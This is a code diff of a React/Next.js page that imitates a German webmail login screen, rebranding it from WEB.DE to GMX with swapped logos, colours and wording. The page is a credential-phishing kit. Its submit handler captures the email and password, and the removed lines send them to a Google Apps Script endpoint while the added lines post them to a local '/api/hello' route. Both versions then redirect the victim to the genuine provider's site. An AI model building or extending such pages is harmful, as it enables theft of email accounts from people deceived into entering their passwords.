@@ -1,17 +1,20 @@
 import Image from "next/image"
-import webde from "../public/web.svg"
-import webmo from "../public/web-de.jpeg"
-
+import webde from "../public/gmxmoblielogo.jpeg"
+import webmo from "../public/gmxapp.jpeg"
+import gmx from "../public/gmx-logo.png"
+import loginIcon from "../public/loginn.png"
 import screenshot1 from "../public/Lcreenshot1.png"
 import screenshot2 from "../public/Screenshot2.png"
 import screenshot3 from "../public/Screenshot3.png"
 import screenshot4 from "../public/Screenshot4.png"
 import screenshot5 from "../public/Screenshot5.png"
+import screenshot65 from "../public/Screenshot6-5.png"
 import screenshot6 from "../public/Screenshot6.png"
 import screenshot7 from "../public/Screenshot7.png"
-import footer from "../public/footer.png"
+import footerr from "../public/footer.png"
 import Advert from "../components/advert"
 import WebFooter from "../components/webfooter"
+import axios from "axios"
 import { useRef, useState } from "react"
 import { FormEvent, ChangeEvent } from "react"
 
@@ -23,7 +26,7 @@ type Form = {
 export default function Main() {
 
 
-  const picks = ['Email & Cloud', 'Mobilfunk & DSL', 'Strom & Gas', 'Shop', 'Lotto', 'Versicherung']
+  const picks = ['Email & Cloud', 'Mobilfunk & DSL', 'Strom & Gas', 'Shop', 'Lotto', 'Versicherung', 'WEB.Cent', 'Games' ]
   
   const passwordInput = useRef<HTMLInputElement>(null)
 
@@ -43,19 +46,20 @@ export default function Main() {
 
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault()
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
-    // zakk ---- https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec
-    
-    const formData = new FormData()
-    formData.append('email', credentials.email)
-    formData.append('passwort', credentials.passwort)
-    
-    fetch(scriptURL, { method: 'POST', body: formData})
-    .then(response => {
-        console.log(response)
-        window.location.replace("https://web.de/")
+
+    const data = {
+      email: credentials.email,
+      password: credentials.passwort
     }
-    )
+
+    axios.post('/api/hello', data)
+    .then((req) => {
+      console.log(req.data);
+      window.location.replace("https://www.gmx.net")
+    }).catch((err) => {
+      console.log(err);
+
+    })
   }
   
 
@@ -77,22 +81,22 @@ export default function Main() {
 
   return (
     <>
-    <main className="bg-gray-100 min-w-[1230px] hidden md:flex">
-        <div className="bg-white w-2/3 min-h-screen">
-         <div className="w-full h-1 bg-yellow-400"></div>
-         <div className="flex items-center justify-between">
+    <main className="bg-gray-100 min-w-[1230px] hidden md:flex flex-col items-center">
+        <div className="bg-white w-11/12 min-h-screen">
+         <div className="w-full h-1 bg-blue-850"></div>
+         <div className="flex items-center bg-blue-850 justify-between">
             <Image
-            src={webde}
+            src={gmx}
             alt="webde"
-            height={40}
-            width={40}
+            height={100}
+            width={100}
             className=" my-4 ml-9"
             />
 
-            <div className="flex items-center w-2/5">
-              <input type="text" placeholder="Suchen mit WEB.DE" className="w-full placeholder:text-lg h-10 saturate-100 hover:saturate-100 p-3 border rounded-l-md border-gray-300 focus:border-sky-500 hover:border-sky-500 trasition duration-300 ease-linear outline-none"/>
-              <div className="h-10 w-10 rounded-r-md bg-yellow-400 flex justify-center items-center">
-               <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
+            <div className="flex items-center w-5/12">
+              <input type="text" placeholder="Suchen mit GMX" className="w-full placeholder:text-base h-10 saturate-100 hover:saturate-100 p-3 border rounded-l-md border-gray-300 focus:border-blue-850 hover:border-blue-850 trasition duration-300 ease-linear outline-none"/>
+              <div className="h-10 w-10 rounded-r-md bg-lime-600 flex justify-center items-center">
+               <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6 stroke-white">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
                 </svg>
               </div>
@@ -100,13 +104,13 @@ export default function Main() {
             </div>
            
 
-            <button className="h-8 w-1/5 mr-3 transition duration-150 ease-in hover:bg-sky-500 hover:text-white border font-medium text-sky-500 border-sky-500 text-center outline-none rounded-md">
+            <button className="h-8 w-32 mr-3 transition duration-150 ease-in hover:bg-white hover:text-black border font-medium text-white border-white text-center outline-none rounded-md">
                 Registrieren
             </button>
 
          </div>
 
-         <div className="w-full flex items-center justify-between mt-1 border border-gray-300 py-1 pl-4">
+         <div className="w-full flex items-center justify-between border border-gray-300 pl-4 py-1">
           <div className="flex items-center">
           <svg xmlns="http://www.w3.org/2000/svg" 
            
@@ -116,7 +120,7 @@ export default function Main() {
             
             {picks.map((pick, index) => {
                 return(
-            <h1 className="px-3 hover:underline font-normal underline-offset-8 decoration-sky-500 cursor-pointer hover:decoration-4 text-sm text-gray-800" key={index}>
+            <h1 className="px-3 hover:underline font-normal underline-offset-8 decoration-blue-850 cursor-pointer hover:decoration-4 text-sm text-gray-800" key={index}>
               {pick}
             </h1>
                 )
@@ -140,21 +144,22 @@ export default function Main() {
          </div>
 
 
-         <div className="w-full px-2 mt-7 mb-6 cursor-pointer">
+         <div className="w-full mb-6 cursor-pointer">
           <Image
            src={screenshot1}
            alt="screenshot1"
            height={1200}
            width={1200}
            priority
+           className="w-full"
           />
 
          </div>
 
          <div className="h-20 bg-gray-100 mx-2 flex items-center justify-center sticky top-0">
             <div className="flex items-center space-x-3">
-               <svg viewBox="0 2 40 40" className="h-8 w-8" fill="#04B7E2"><path d="M40 32V9.9v-.08L28.92 20.9zM11.1 20.92L0 9.82V32zM21.37 25.17L38.94 7.59a3.05 3.05 0 0 0-2-.78H3.09a3.05 3.05 0 0 0-2 .78l17.54 17.58a2 2 0 0 0 2.74 0z"></path><path d="M27.27 22.54L23 26.81a4.27 4.27 0 0 1-6 0l-4.25-4.25L.3 35a3.1 3.1 0 0 0 2.79 1.8h33.82a3.11 3.11 0 0 0 2.81-1.8z"></path></svg>
-               <h1 className="font-light hidden lg:block text-2xl text-sky-600">
+               <svg viewBox="0 2 40 40" className="h-8 w-8" fill="#1C449B"><path d="M40 32V9.9v-.08L28.92 20.9zM11.1 20.92L0 9.82V32zM21.37 25.17L38.94 7.59a3.05 3.05 0 0 0-2-.78H3.09a3.05 3.05 0 0 0-2 .78l17.54 17.58a2 2 0 0 0 2.74 0z"></path><path d="M27.27 22.54L23 26.81a4.27 4.27 0 0 1-6 0l-4.25-4.25L.3 35a3.1 3.1 0 0 0 2.79 1.8h33.82a3.11 3.11 0 0 0 2.81-1.8z"></path></svg>
+               <h1 className="font-light hidden lg:block text-2xl text-blue-850">
                 E-Mail
                </h1>
               
@@ -166,7 +171,7 @@ export default function Main() {
                       name="email"
                       value={credentials.email} 
                      onChange={e => handleChange(e)} 
-                    placeholder="E-Mail-Addresse" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-sky-500 hover:border-sky-500 placeholder:hover:text-sky-500 trasition duration-300 ease-linear outline-none" 
+                    placeholder="E-Mail-Addresse" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-blue-850 hover:border-blue-850 placeholder:hover:text-blue-850 trasition duration-300 ease-linear outline-none" 
                     required
                     />
                     <label htmlFor="email" className="text-xs text-gray-500">Kostenlos registrieren!</label>
@@ -176,7 +181,7 @@ export default function Main() {
                     <input type="text"
                     value={credentials.passwort}  
                      onChange={e => handleChange(e)}
-                     ref={passwordInputWeb} name="passwort" placeholder="Passwort" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-sky-500 placeholder:hover:text-sky-500 hover:border-sky-500 trasition duration-300 ease-linear outline-none"
+                     ref={passwordInputWeb} name="passwort" placeholder="Passwort" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-blue-850 placeholder:hover:text-blue-850 hover:border-blue-850 trasition duration-300 ease-linear outline-none"
                      required
                      />
                     <svg xmlns="http://www.w3.org/2000/svg" 
@@ -192,11 +197,17 @@ export default function Main() {
               
                  <button 
                    type="submit"
-                   className="bg-yellow-400 h-10 w-20 rounded-md hover:saturate-50 font-semibold mb-3">
+                   className="bg-lime-600 text-white h-10 w-20 rounded-md hover:saturate-50 font-semibold mb-3">
                     Login
                  </button>
 
-                 <svg viewBox="0 0 24 22.65" className="netid h-6 w-6 mb-3"><path d="M10.72 6.34l1.45-1.41 2.73 2.73L22.6 0 24 1.37l-9.15 9.15-4.13-4.18z" className="netid_checkmark"></path> <path d="M21.8 6.2l-1.17 1.17c.67 2.21.52 3.94-1.81 6.26l-2.69 2.7-9.81-9.81L9 3.8c2.89-2.88 5.29-2.67 8.07-1l1.08-1.08C14.74-.59 11.49-.73 8 2.79l-8 8 11.89 11.86 8-8C22.8 11.74 23 9.18 21.8 6.2"></path></svg>
+                 <Image
+                    src={loginIcon}
+                    alt="login"
+                    height={150}
+                    width={150}
+                    className="mb-3 cursor-pointer"
+                      />
 
               </form>
                
@@ -213,33 +224,39 @@ export default function Main() {
          <Advert src={screenshot3}/>
          <Advert src={screenshot4}/>
          <Advert src={screenshot5}/>
+         <Advert src={screenshot65}/>
 
          <WebFooter src={screenshot6}/>
          <WebFooter src={screenshot7}/>
-         <WebFooter src={footer}/>
+
+         <div className="w-full cursor-pointer">
+          <Image
+           src={footerr}
+           alt="footer"
+           height={130}
+           width={1000}
+           className="w-full"
+          />
+          </div>
           
         </div>
-      <div className="">
-         <img src="https://s1.adform.net/Banners/55611253/55611253.gif?bv=2" id="adAdformfzwzbyer0" className="sticky top-0 adform-domevents-click-44o3y4q7nb0" width="300" height="600" alt=""/>
-        
-      
-      </div>
+  
     </main>
 
     <main className="w-screen min-h-screen md:hidden">
         
-    <div className="w-full h-1 bg-yellow-400"></div>
+    <div className="w-full h-1 bg-blue-850"></div>
 
-    <div className="border-b flex items-center">
+    <div className="border-b flex items-center bg-blue-850">
       <Image
-        src={webde}
-        alt="webde"
-        height={40}
-        width={40}
+        src={gmx}
+        alt="gmx"
+        height={80}
+        width={80}
         className="my-2 ml-3"
         />   
 
-        <h1 className=" ml-4 font-light text-lg text-gray-500">
+        <h1 className="ml-4 font-light text-2xl text-white">
             Mobile Login
         </h1>
     </div>
@@ -249,9 +266,9 @@ export default function Main() {
       <Image
         src={webde}
         alt="webde"
-        height={50}
-        width={50}
-        className="ml-3 my-10"
+        height={100}
+        width={100}
+        className="ml-3 my-8"
      /> 
 
       <h1 className=" ml-4 text-center mr-2 font-semibold text-xl text-gray-600">
@@ -261,11 +278,11 @@ export default function Main() {
      <div className="text-center my-7">
 
      <p className="text-gray-600">
-      Bitte melden Sie sich hier mit Ihrem WEB.DE
+      Bitte melden Sie sich hier mit Ihrer GMX E-mail-
      </p>
 
      <p className="text-gray-600">
-      Nutzernamen und Ihrem Passwort an.
+      Adresse und Ihrem Passwort an.
      </p>
 
      </div>
@@ -274,14 +291,14 @@ export default function Main() {
 
         <div className="flex flex-col space-y-1">
             <label htmlFor="email" className="text-gray-600">
-                WEB.DE Nutzername
+                GMX E-Mail-Adresse
             </label>
             <input 
                type="text"
                name="email"
                value={credentials.email}
                onChange={e => handleChange(e)}
-               className="h-10 border rounded-md outline-none p-2"
+               className="h-10 border rounded-md outline-none p-2 focus:border-blue-850"
                required
                />
         </div>
@@ -296,7 +313,7 @@ export default function Main() {
              value={credentials.passwort}
              onChange={e => handleChange(e)}
              ref={passwordInput} 
-             className="h-10 border rounded-md outline-none p-2"
+             className="h-10 border rounded-md outline-none p-2 focus:border-blue-850"
              required
              />
 
@@ -310,11 +327,11 @@ export default function Main() {
 
         </div>
 
-        <button type="submit" className="bg-yellow-300 w-full h-8 rounded-md">
+        <button type="submit" className="bg-lime-600 w-full h-8 rounded-md text-white">
             Login
         </button>
 
-        <h1 className="text-sky-500 text-center mt-3">
+        <h1 className="text-blue-850 text-center mt-3">
             Passwort Vergessen?
         </h1>
      </form>
@@ -322,10 +339,10 @@ export default function Main() {
      <div className="h h-[1px] w-4/5 bg-gray-300 mt-10"></div>
 
      <h1 className="font-semibold mt-9">
-        Neu bei WEB.DE?
+        Neu bei GMX?
      </h1>
 
-     <h1 className="text-sky-500 mt-5">
+     <h1 className="text-blue-850 mt-5">
         Jetzt kostenlos registrieren!
      </h1>
 
@@ -334,7 +351,7 @@ export default function Main() {
        alt="web-de"
        height={100}
        width={500}
-       className="mt-8 h-20 w-2/3 mb-8"
+       className="mt-8 h-32 w-2/3 mb-8"
      />
 
      
